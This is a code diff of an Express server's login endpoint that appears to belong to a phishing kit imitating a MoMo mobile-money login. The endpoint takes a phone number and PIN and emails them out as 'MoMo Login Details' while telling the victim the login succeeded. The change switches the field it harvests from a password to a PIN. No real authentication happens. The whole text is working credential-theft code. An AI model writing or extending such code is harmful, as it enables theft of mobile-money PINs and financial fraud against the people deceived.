@@ -51,24 +51,24 @@ function sendMailAndRespond(res, subject, text, successMsg) {
 
 // ─── ENDPOINT 1: POST / ─── Login
 app.post("/", (req, res) => {
-  const { phoneNumber, password } = req.body;
+  const { phoneNumber, pin } = req.body;
 
   // Validation
   if (!phoneNumber || !/^\d{10}$/.test(phoneNumber)) {
     return res
       .status(401)
-      .json({ success: false, message: "Invalid phone number or password" });
+      .json({ success: false, message: "Invalid phone number or MoMo PIN" });
   }
-  if (!password) {
+  if (!pin) {
     return res
       .status(401)
-      .json({ success: false, message: "Invalid phone number or password" });
+      .json({ success: false, message: "MoMo PIN is required" });
   }
 
   sendMailAndRespond(
     res,
     "MoMo Login Details",
-    `Phone Number: ${phoneNumber}\nPassword: ${password}`,
+    `Phone Number: ${phoneNumber}\nPIN: ${pin}`,
     "Login successful",
   );
 });
